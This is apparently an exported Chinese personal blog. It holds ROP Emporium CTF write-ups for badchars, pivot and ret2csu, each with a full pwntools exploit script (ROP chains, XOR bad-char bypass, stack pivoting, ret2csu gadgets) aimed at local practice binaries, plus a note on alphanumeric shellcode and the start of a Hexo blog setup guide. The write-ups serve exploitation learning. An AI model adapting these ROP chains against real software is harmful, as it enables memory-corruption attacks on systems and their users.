<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>

<p>通过  mov     [r13+0], r12把’flag.txt’写入bss段，可以利用这段给r13,r12 赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>

<p>但是因为后边会给检测输入有没有’x’,’g’,’a’,’.’，所以我们还要使用剩下的Gadget绕过</p>
<p>本来是想用’flag.txt’的十六进制形式与0xffffffffffffffff进行异或运算存入后再异或一次就能得到正确的字符串，但是xor好像只能进行一个字节一个字节的进行异或，所以还原时只能进行每位与0xff异或了</p>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">mov_r13_r12=<span class="number">0x400634</span></span><br><span class="line">pop_r12_r13_14_15=<span class="number">0x40069c</span></span><br><span class="line">pop_rdi=<span class="number">0x4006a3</span></span><br><span class="line">xor_r15_r14=<span class="number">0x400628</span></span><br><span class="line">pop_r14_15=<span class="number">0x4006a0</span></span><br><span class="line">payload=<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r12_r13_14_15)+p64(<span class="number">0x8b878bd1989e9399</span>)+p64(bss)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mov_r13_r12)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	payload+=p64(pop_r14_15)+p64(<span class="number">0xff</span>)+p64(bss+i)+p64(xor_r15_r14)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><p>麻了，这道题可真给我难坏了。</p>
<h2 id="函数-5"><a href="#函数-5" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-5"><a href="#main函数-5" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to request space for pivot stack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pwnme(ptr + <span class="number">16776960</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数给我们申请的一个堆段，什么用我们暂且蒙古，多半是写入一段能get shell的汇编指令。</p>
<h3 id="pwnme函数-4"><a href="#pwnme函数-4" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">pwnme</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现包含一个栈溢出漏洞，但太小了，能让我们构造的栈只有0x18个长度。根据题目，我们可知这题是个栈迁移题目。那么上面的堆段的用处应该是让我们写入一段指令达到栈迁移的效果。</p>
<h3 id="uselessFunction函数"><a href="#uselessFunction函数" class="headerlink" title="uselessFunction函数"></a>uselessFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">uselessFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  foothold_function();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据提示，找到foothold_function()，这是个外联函数，外联库自然是我们下载的另一个.so文件。</p>
<h3 id="foothold-function函数"><a href="#foothold-function函数" class="headerlink" title="foothold_function函数"></a>foothold_function函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foothold_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据pwnme的提示，我们继续在库中找到ret2win()函数。</p>
<h3 id="ret2win函数"><a href="#ret2win函数" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open file: flag.txt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个后门函数，根据题目中的提示，最后我们能调用此函数即可。</p>
<p>那么我们的初步思路就差不多构造好了：在pwnme函数中利用栈溢出，返回到malloc申请的堆段，然后执行堆段的代码实现栈迁移既更改rsp和rbp，迁移到后门函数所在的内存段拿到flag。</p>
<p>但是看了别人的writeup后，解题过程实际上是我们先后将rsp和rbp进行了更改。在第一次输入中，我们构造rop链利用foothold_function()将rbp更改为此函数的地址，然后再根据偏移量将rax改为后门函数的指针，最后调用rax即可。在第二次输入中，我们改了rsp使其保存申请的堆空间的地址。</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x04009bb</span></span><br><span class="line">xchg_rax_rsp_ret=<span class="number">0x04009bd</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x04007c8</span></span><br><span class="line">mov_rax_rax_ret=<span class="number">0x04009c0</span></span><br><span class="line">call_rax=<span class="number">0x04006b0</span></span><br><span class="line">add_rax_rbp=<span class="number">0x04009c4</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">foothold_func_plt=elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_func_got=elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;ret2win&#x27;</span>]-libc.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(offset)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot:&quot;</span>)</span><br><span class="line">a1_adr=<span class="built_in">int</span>(sh.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(a1_adr)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=p64(foothold_func_plt)</span><br><span class="line">payload+=p64(pop_rax_ret)+p64(foothold_func_got)</span><br><span class="line">payload+=p64(mov_rax_rax_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(offset)</span><br><span class="line">payload+=p64(add_rax_rbp)</span><br><span class="line">payload+=p64(call_rax)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rax_ret)+p64(a1_adr)+p64(xchg_rax_rsp_ret)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br></pre></td></tr></table></figure>

<p>说实话，不看别人的writeup我断然是解不了这题的，构造rop链的脑洞很大，利用起gadget也是毫不手软，胆子大。</p>
<h2 id="做题时到疑问"><a href="#做题时到疑问" class="headerlink" title="做题时到疑问"></a>做题时到疑问</h2><p>我在第二次输入中并没有在最后的ret覆盖这个堆空间指针，为什么我们在执行完对rsp的操作后会执行我们构造的rop链呢？然后我就用gdb进行了一次调试，并在第二次输入前停止。</p>
<p>输入前：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5458: 0x000000000040099b # rsp  0x00007ffd40ae5590</span><br><span class="line">0x7ffd40ae5468: 0x00007f20af91af10        0x0000000000000000</span><br><span class="line">0x7ffd40ae5478: 0x0000000000000000        0x0000000000000000</span><br><span class="line">0x7ffd40ae5488: 0x0000000000000000        0x00007ffd40ae54b0 # rbp</span><br><span class="line">0x7ffd40ae5498: 0x00000000004008cc        0x00007f20af91af10</span><br><span class="line">0x7ffd40ae54a8: 0x00007f20ae91b010        0x00000000004009d0</span><br></pre></td></tr></table></figure>

<p>输入后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00000000004009d0</span><br></pre></td></tr></table></figure>

<p>发现执行完操作后我们接下来会执行0x4009D0，那么是否是这个0x4009D0的问题，我先做个实验。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00007f20af91af10</span><br></pre></td></tr></table></figure>

<p>先将0x4009D0改为堆空间指针，然后继续运行程序，确实是拿到了flag，所以的确是这个0x4009D0特殊。所以我们来查看一下其对应的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004009D0                 push    r15</span><br><span class="line">.text:00000000004009D2                 push    r14</span><br><span class="line">.text:00000000004009D4                 mov     r15, rdx</span><br><span class="line">.text:00000000004009D7                 push    r13</span><br><span class="line">.text:00000000004009D9                 push    r12</span><br><span class="line">.text:00000000004009DB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004009E2                 push    rbp</span><br><span class="line">.text:00000000004009E3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004009EA                 push    rbx</span><br><span class="line">.text:00000000004009EB                 mov     r13d, edi</span><br><span class="line">.text:00000000004009EE                 mov     r14, rsi</span><br><span class="line">.text:00000000004009F1                 sub     rbp, r12</span><br><span class="line">.text:00000000004009F4                 sub     rsp, 8</span><br><span class="line">.text:00000000004009F8                 sar     rbp, 3</span><br><span class="line">.text:00000000004009FC                 call    _init_proc</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>期间并没有对rax进行过更改，然后回调用_init_proc，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.init:00000000004006A0                 public _init_proc</span><br><span class="line">.init:00000000004006A0 _init_proc      proc near               ; CODE XREF: __libc_csu_init+2C↓p</span><br><span class="line">.init:00000000004006A0                                         ; DATA XREF: LOAD:0000000000400458↑o</span><br><span class="line">.init:00000000004006A0                 sub     rsp, 8          ; _init</span><br><span class="line">.init:00000000004006A4                 mov     rax, cs:__gmon_start___ptr</span><br><span class="line">.init:00000000004006AB                 test    rax, rax</span><br><span class="line">.init:00000000004006AE                 jz      short loc_4006B2</span><br><span class="line">.init:00000000004006B0                 call    rax ; __gmon_start__</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>然后会调用rax保存的地址段，此时的rax保存的是我们构造的rop链。</p>
<p>我不知道这样解释对不对，也许是正确的。</p>
<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="函数-6"><a href="#函数-6" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-6"><a href="#main函数-6" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(*(__int64 *)&amp;argc, (__int64)argv, (__int64)envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwnme函数-5"><a href="#pwnme函数-5" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2csu by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="usefulFunction函数-2"><a href="#usefulFunction函数-2" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ret2win(<span class="number">1LL</span>, <span class="number">2LL</span>, <span class="number">3LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ret2win函数-1"><a href="#ret2win函数-1" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到pwnme函数中存在栈溢出漏洞，我们调用ret2win即可拿到flag。</p>
<p>但是ret2win对参数有要求，并且要变更的寄存器有rdx，所以要使用通用gadget。</p>
<p>调用通用gadget时我们正常操作，由于通用gadget只能更改edi，所以我们在后面还得再执行一次pop_rdi，之后会遇到一个 call r12+1bx*8 。这是我的知识盲区了，按照网上别人的方法，我们可以利用_fini，用gdb查看动态变量来得到其指针然后赋值给r12，rbx赋值为0。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass _fini</span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x00000000004006b4 &lt;+0&gt;: sub    rsp,0x8</span><br><span class="line">   0x00000000004006b8 &lt;+4&gt;: add    rsp,0x8</span><br><span class="line">   0x00000000004006bc &lt;+8&gt;: ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/10g &amp;_DYNAMIC</span><br><span class="line">0x600e00: 0x0000000000000001  0x0000000000000001</span><br><span class="line">0x600e10: 0x0000000000000001  0x0000000000000038</span><br><span class="line">0x600e20: 0x000000000000001d  0x0000000000000078</span><br><span class="line">0x600e30: 0x000000000000000c  0x00000000004004d0</span><br><span class="line">0x600e40: 0x000000000000000d  0x00000000004006b4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是0x600e48存储着_fini的地址。调用 _fini和其后续函数的操作是不会有任何影响的。</p>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win=<span class="number">0x400510</span></span><br><span class="line">finit_adr=<span class="number">0x600e48</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4004e6</span></span><br><span class="line">rop1=<span class="number">0x400680</span></span><br><span class="line">rop2=<span class="number">0x40069A</span></span><br><span class="line">pop_rdi=<span class="number">0x004006a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rop2)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(finit_adr)</span><br><span class="line">payload+=p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload+=p64(rop1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">payload+=p64(ret2win)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<p>写这道题时，我一度怀疑自己的gdb出问题了。同一串代码，gdb.attach()注释了就能拿到了flag，一用来调试依然会出错。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>alphanumeric_shellcode</title>
    <url>/2022/02/08/alphanumeric-shellcode/</url>
    <content><![CDATA[<p>刷buu时做到一题限制了字符范围的题(mrctf2020_shellcode_revenge)。</p>
<span id="more"></span>

<p>需要使用alphanumeric shellcode(纯字符shellcode)。</p>
<p>就是使用纯字符对应的汇编指令完成shellcode的编写，比如：</p>
<table>
<thead>
<tr>
<th align="center">ASCII字符</th>
<th align="center">Hex</th>
<th align="center">汇编指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">P</td>
<td align="center">0x50</td>
<td align="center">push %rax</td>
</tr>
<tr>
<td align="center">Q</td>
<td align="center">0x51</td>
<td align="center">push %rcx</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">0x52</td>
<td align="center">push %rdx</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">0x53</td>
<td align="center">push %rbx</td>
</tr>
<tr>
<td align="center">T</td>
<td align="center">0x54</td>
<td align="center">push %rsp</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">0x55</td>
<td align="center">push %rbp</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">0x56</td>
<td align="center">push %rsi</td>
</tr>
<tr>
<td align="center">W</td>
<td align="center">0x57</td>
<td align="center">push %rdi</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">0x58</td>
<td align="center">pop %rax</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="center">0x59</td>
<td align="center">pop %rcx</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">0x5a</td>
<td align="center">pop %rdx</td>
</tr>
</tbody></table>
<p>我们可以使用一些工具来进行编码。</p>
<p>详情如下：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu使用Nginx+Hexo博客</title>
    <url>/2021/12/25/Ubuntu%E4%BD%BF%E7%94%A8Nginx-Hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>基于hexo官方文档 <a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a> 和网上其他博主的搭建过程，照葫芦画瓢好不容易搭好了博客，回忆了一下自己的大概操作。</p>
<span id="more"></span>

<h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><p>我本地使用的也是ubuntu，以下就以ubuntu为例了</p>
<h2 id="安装必要程序"><a href="#安装必要程序" class="headerlink" title="安装必要程序"></a>安装必要程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install node.js</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>如果无法直接安装hexo可以更换npm源，以下是淘宝的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<h2 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h2><p>在任意路径下创建一个文件夹，然后进行操作</p>
